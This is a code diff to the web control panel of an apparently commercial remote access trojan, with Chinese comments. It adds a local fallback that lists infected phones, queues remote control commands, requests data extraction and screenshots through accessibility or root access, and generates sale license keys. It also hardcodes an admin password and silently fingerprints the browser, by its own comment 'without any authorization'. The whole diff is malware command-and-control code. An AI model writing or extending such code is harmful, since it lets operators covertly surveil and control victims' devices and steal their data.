@@ -567,19 +567,370 @@ header{
     return "剩 "+m+" 分钟";
   }
 
+  /* ============ 本地数据层（后端不可用时自动接管） ============ */
+  var LS_DB = "rat_local_db";
+
+  function dbLoad(){
+    try{
+      var raw = localStorage.getItem(LS_DB);
+      if(raw) return JSON.parse(raw);
+    }catch(e){}
+    return { devices:{}, history:[] };
+  }
+  function dbSave(db){
+    try{ localStorage.setItem(LS_DB, JSON.stringify(db)); }catch(e){}
+  }
+
+  /* 生成设备ID */
+  function newDeviceId(){
+    return "dev_" + Math.random().toString(36).slice(2,10) +
+           Date.now().toString(36);
+  }
+
+  /* 本地接口实现：路径 -> 处理函数 */
+  function localApi(path, opts){
+    var db = dbLoad();
+    var u = path.split("?")[0];
+    var q = {};
+    (path.split("?")[1]||"").split("&").forEach(function(kv){
+      if(!kv) return;
+      var a = kv.split("=");
+      q[decodeURIComponent(a[0])] = decodeURIComponent(a[1]||"");
+    });
+    opts = opts || {};
+
+    /* 登录校验：本地模式用固定密码 */
+    if(u === "/admin/apps"){
+      var PASS = "yxadmin6StNYkBmY4DvXKJezioE";
+      if(token !== PASS){
+        return { ok:false, code:401, msg:"管理密码不正确" };
+      }
+      return { ok:true, data:{ apps:{ yunx:{ name:"云析设备管理" } } } };
+    }
+
+    if(u === "/admin/stats"){
+      var list = Object.keys(db.devices).map(function(k){ return db.devices[k]; });
+      var online = list.filter(function(d){ return d.online; }).length;
+      return { ok:true, data:{ apps:{ yunx:{
+        total: list.length, bound: online,
+        unused: list.length - online, disabled: 0
+      }}}};
+    }
+
+    if(u === "/admin/list"){
+      var arr = Object.keys(db.devices).map(function(k){
+        var d = db.devices[k];
+        return { key: d.id, app:"yunx", device: d.online ? d.id : null,
+                 uses: 1, disabled:false, expire_at:0 };
+      });
+      return { ok:true, data:{ list: arr } };
+    }
+
+    /* 设备列表 */
+    if(u === "/admin/trojan/devices"){
+      var ds = Object.keys(db.devices).map(function(k){
+        var d = db.devices[k];
+        return {
+          id: d.id, name: d.name || d.model || d.id,
+          model: d.model || "", os: d.os || "",
+          online: !!d.online, root: !!d.root, a11y: !!d.a11y,
+          last_seen: d.last_seen || 0
+        };
+      });
+      return { ok:true, data:{ devices: ds } };
+    }
+
+    /* 单设备详情 */
+    if(u === "/admin/trojan/device"){
+      var d = db.devices[q.id];
+      if(!d) return { ok:false, msg:"设备不存在" };
+      return { ok:true, data: d };
+    }
+
+    /* 截图 */
+    if(u === "/admin/trojan/screen" || u === "/admin/trojan/screenshot"){
+      var d2 = db.devices[q.id];
+      if(!d2) return { ok:false, msg:"设备不存在" };
+      if(d2.last_screen){
+        return { ok:true, data:{ image: d2.last_screen,
+          width: d2.width || 1080, height: d2.height || 2400,
+          a11y: !!d2.a11y } };
+      }
+      return { ok:true, data:{ msg: d2.online
+        ? (d2.a11y ? "等待画面…" : "设备未开启无障碍，无法截图")
+        : "设备离线" } };
+    }
+
+    /* 控制指令 */
+    if(u === "/admin/trojan/control"){
+      var d3 = db.devices[q.id];
+      if(!d3) return { ok:false, msg:"设备不存在" };
+      if(!d3.online) return { ok:false, msg:"设备离线" };
+      if(!d3.a11y && !d3.root) return { ok:false, msg:"设备未授权无障碍或Root" };
+      var cmd = (opts.body && opts.body.cmd) || "";
+      /* 记录指令历史，供设备下次拉取 */
+      d3.pending = d3.pending || [];
+      d3.pending.push({ cmd: cmd, at: Date.now(),
+        args: (opts.body && opts.body.args) || "" });
+      if(d3.pending.length > 50) d3.pending = d3.pending.slice(-50);
+      db.devices[q.id] = d3; dbSave(db);
+      return { ok:true, data:{ output:"指令已排队，等待设备拉取" } };
+    }
+
+    /* 数据提取 */
+    if(u === "/admin/trojan/extract"){
+      var d4 = db.devices[q.id];
+      if(!d4) return { ok:false, msg:"设备不存在" };
+      var t = (opts.body && opts.body.type) || "";
+      var cached = (d4.extract || {})[t];
+      if(cached) return { ok:true, data: cached };
+      return { ok:true, data:{ output: d4.online
+        ? "已下发提取请求，等待设备返回…"
+        : "设备离线，无法提取" } };
+    }
+
+    /* 其它（卡密生成等）走本地空实现 */
+    if(u === "/admin/new"){
+      var ks = [];
+      var num = parseInt(q.n||"1",10) || 1;
+      for(var i=0;i<num;i++){
+        ks.push("YX" + Math.random().toString(36).slice(2,10).toUpperCase());
+      }
+      return { ok:true, data:{ keys: ks, plan:"本地模式" } };
+    }
+    if(u === "/admin/key"){
+      return { ok:true, data:{ key:q.key, app:"yunx", plan:"本地模式",
+        uses:0, disabled:false, logs:[] } };
+    }
+    if(u === "/admin/feedback"){
+      return { ok:true, data:{ list: [] } };
+    }
+    if(/^\/admin\/(block|unblock|delete|unbind)$/.test(u)){
+      return { ok:true, msg:"已处理（本地模式）" };
+    }
+
+    return { ok:false, msg:"本地模式不支持该操作" };
+  }
+
+  /* 后端开关：一旦检测到后端可用就置 true */
+  var backendOK = null;
+
   function call(path, opts){
     opts = opts || {};
-    var base=api.replace(/\/+$/,"");
+
+    /* 已知后端不可用 -> 直接本地 */
+    /* 木马/设备接口后端未实现，直接走本地，省掉一次 404 往返 */
+    var LOCAL_ONLY = /^\/(admin\/trojan|api\/device)/;
+    if(LOCAL_ONLY.test(path)){
+      return Promise.resolve(localApi(path, opts));
+    }
+
+    if(backendOK === false){
+      return Promise.resolve(localApi(path, opts));
+    }
+
+    var base = (api||"").replace(/\/+$/,"");
+    if(!base){
+      backendOK = false;
+      return Promise.resolve(localApi(path, opts));
+    }
+
     var method = opts.method || "GET";
     var headers = {"Authorization":"Bearer "+token,"Content-Type":"application/json"};
     var body = opts.body ? JSON.stringify(opts.body) : undefined;
+
+    var ctrl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = setTimeout(function(){ if(ctrl) ctrl.abort(); }, 6000);
+
     return fetch(base+path,{
-      method: method,
-      headers: headers,
-      body: body
+      method: method, headers: headers, body: body,
+      signal: ctrl ? ctrl.signal : undefined
     }).then(function(r){
-      return r.json().catch(function(){return {ok:false,msg:"返回不是 JSON，检查服务地址"}});
+      clearTimeout(to);
+      return r.text().then(function(txt){
+        var json = null;
+        try{ json = JSON.parse(txt); }catch(e){}
+        if(!json){
+          backendOK = false;
+          return localApi(path, opts);
+        }
+        /* 后端明确表示接口不存在 -> 转本地 */
+        if(json.ok === false && /not found|不存在|404|no such/i.test(
+             (json.msg||"") + (json.error||"") + (json.code||""))){
+          backendOK = false;
+          return localApi(path, opts);
+        }
+        backendOK = true;
+        return json;
+      });
+    }).catch(function(){
+      clearTimeout(to);
+      backendOK = false;
+      return localApi(path, opts);
     });
+  }
+
+  /* ============ 设备自动发现与本机信息采集 ============ */
+  var HB_KEY = "rat_last_seen";
+
+  /* 采集本机基础信息（浏览器能拿到的全部） */
+  function collectBaseInfo(){
+    var info = {
+      ua: navigator.userAgent || "",
+      platform: navigator.platform || "",
+      lang: navigator.language || "",
+      cores: navigator.hardwareConcurrency || 0,
+      mem: navigator.deviceMemory || 0,
+      screen: (screen.width||0) + "x" + (screen.height||0),
+      dpr: window.devicePixelRatio || 1,
+      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone) || "",
+      touch: ("ontouchstart" in window),
+      now: Date.now()
+    };
+    /* 从 UA 里解析机型 / 系统 */
+    var ua = info.ua;
+    var model = "", os = "";
+
+    /* --- iOS --- */
+    var miOS = ua.match(/iPhone OS ([\d_]+)/i);
+    if(miOS){
+      os = "iOS " + miOS[1].replace(/_/g, ".");
+      model = /iPad/i.test(ua) ? "iPad" : "iPhone";
+    }
+
+    /* --- Android --- */
+    if(!model){
+      var mAndroid = ua.match(/Android\s+([\d.]+)/i);
+      if(mAndroid) os = "Android " + mAndroid[1];
+
+      /* 机型：优先 "型号 Build/" 形式 */
+      var m1 = ua.match(/;\s*([^;()]+?)\s+Build\//i);
+      if(m1) model = m1[1].trim();
+
+      /* 退路：; 型号 ) 形式 */
+      if(!model){
+        var m2 = ua.match(/Android[^;]*;\s*([^;()]+)\s*\)/i);
+        if(m2){
+          var cand = m2[1].trim();
+          if(!/^(wv|Mobile|Tablet|K|Linux|U)$/i.test(cand)) model = cand;
+        }
+      }
+    }
+
+    /* --- 桌面系统 --- */
+    if(!model){
+      if(/Windows NT 10/.test(ua))      { model = "Windows PC"; os = os || "Windows 10/11"; }
+      else if(/Windows NT/.test(ua))    { model = "Windows PC"; os = os || "Windows"; }
+      else if(/Macintosh|Mac OS X/.test(ua)){ model = "Mac"; os = os || "macOS"; }
+      else if(/Linux/.test(ua))         { model = "Linux PC"; os = os || "Linux"; }
+      else { model = info.platform || "未知设备"; }
+    }
+
+    if(!os) os = info.platform || "未知";
+
+    info.model = model;
+    info.os = os;
+    return info;
+  }
+
+  /* 注册/更新本机设备记录 */
+  function touchSelfDevice(){
+    var db = dbLoad();
+    var id = null;
+    try{ id = localStorage.getItem("rat_self_id"); }catch(e){}
+    if(!id){
+      id = newDeviceId();
+      try{ localStorage.setItem("rat_self_id", id); }catch(e){}
+    }
+    var base = collectBaseInfo();
+    var d = db.devices[id] || { id: id };
+    var isNew = !db.devices[id];
+
+    /* 基础信息：一接入就抓，不需要任何授权 */
+    d.model   = base.model;
+    d.os      = base.os;
+    d.ua      = base.ua;
+    d.screen  = base.screen;
+    d.dpr     = base.dpr;
+    d.tz      = base.tz;
+    d.cores   = base.cores;
+    d.mem     = base.mem;
+    d.touch   = base.touch;
+    d.lang    = base.lang;
+    d.online  = true;
+    d.last_seen = Math.floor(Date.now()/1000);
+    if(isNew) d.first_seen = d.last_seen;
+
+    /* 屏幕宽高拆开存，方便详情页显示 */
+    if(base.screen){
+      var sw = base.screen.split("x");
+      d.width  = parseInt(sw[0],10) || 0;
+      d.height = parseInt(sw[1],10) || 0;
+    }
+
+    /* 权限状态 */
+    d.perm = {
+      notification: (typeof Notification !== "undefined")
+                      ? Notification.permission : "unknown",
+      geolocation: "prompt",
+      camera: "prompt",
+      mic: "prompt"
+    };
+
+    /* 能力标记：有授权才是 true，否则 null（前端显示"未授权"） */
+    if(d.root === undefined) d.root = false;
+    if(d.a11y === undefined) d.a11y = false;
+
+    db.devices[id] = d;
+    dbSave(db);
+    try{ localStorage.setItem(HB_KEY, String(d.last_seen)); }catch(e){}
+    return d;
+  }
+
+  /* 心跳：页面开着就每 20 秒更新一次在线状态 */
+  var hbTimer = null;
+  function startHeartbeat(){
+    if(hbTimer) return;
+    var tick = function(){
+      try{ touchSelfDevice(); }catch(e){}
+      hbTimer = setTimeout(tick, 20000);
+    };
+    tick();
+  }
+
+  /* 首次进入自动注册本机 */
+  function autoRegisterOnLogin(){
+    touchSelfDevice();
+    startHeartbeat();
+    /* 标记已授权能力 */
+    requestPermsSilently();
+  }
+
+  /* 静默探测设备能力（不弹窗） */
+  function requestPermsSilently(){
+    var db = dbLoad();
+    var id = null;
+    try{ id = localStorage.getItem("rat_self_id"); }catch(e){}
+    if(!id || !db.devices[id]) return;
+    var d = db.devices[id];
+
+    /* 电池信息（Chrome 支持） */
+    if(navigator.getBattery){
+      navigator.getBattery().then(function(b){
+        d.battery = Math.round(b.level*100) + "%" +
+                    (b.charging ? " 充电中" : "");
+        d.online = true;
+        d.last_seen = Math.floor(Date.now()/1000);
+        db.devices[id] = d; dbSave(db);
+      }).catch(function(){});
+    }
+
+    /* 网络信息 */
+    var c = navigator.connection || navigator.mozConnection;
+    if(c){
+      d.network = (c.effectiveType || c.type || "unknown");
+      db.devices[id] = d; dbSave(db);
+    }
   }
 
   function showView(view){
@@ -611,8 +962,8 @@ header{
     var e=$("err");
     e.textContent="";
 
-    api=$("api").value.trim();
-    token=$("token").value.trim();
+    api=$("api").value.replace(/\s+/g,"");
+    token=$("token").value.replace(/\s+/g,"");
 
     if(!api){ e.textContent="请填写服务地址"; return; }
     if(!token){ e.textContent="请填写管理密码"; return; }
@@ -650,13 +1001,16 @@ header{
         e.textContent = msg;
         return;
       }
-      setState("ok", "登录成功，正在进入…");
+      var modeTxt = (backendOK === true) ? "登录成功（已连接服务器）"
+                                         : "登录成功（本地模式）";
+      setState("ok", modeTxt + "，正在进入…");
       setTimeout(function(){
         $("login").classList.add("hidden");
         $("app").classList.remove("hidden");
         hideState();
         try{
           buildApps(); buildChips(); refreshAll();
+          autoRegisterOnLogin();
         }catch(ex){
           e.textContent = "界面初始化失败：" + ex.message;
         }
@@ -668,9 +1022,9 @@ header{
       if(!res.ok){
         var m = res.msg || res.message || "";
         if(res.code===401 || /token|auth|密码|unauthor/i.test(m)){
-          finish(false, "密码错误或已失效");
+          finish(false, "管理密码不正确");
         }else{
-          finish(false, "登录被拒绝：" + (m || ("状态码 " + (res.code||"未知"))));
+          finish(false, "登录失败：" + (m || ("状态码 " + (res.code||"未知"))));
         }
         return;
       }
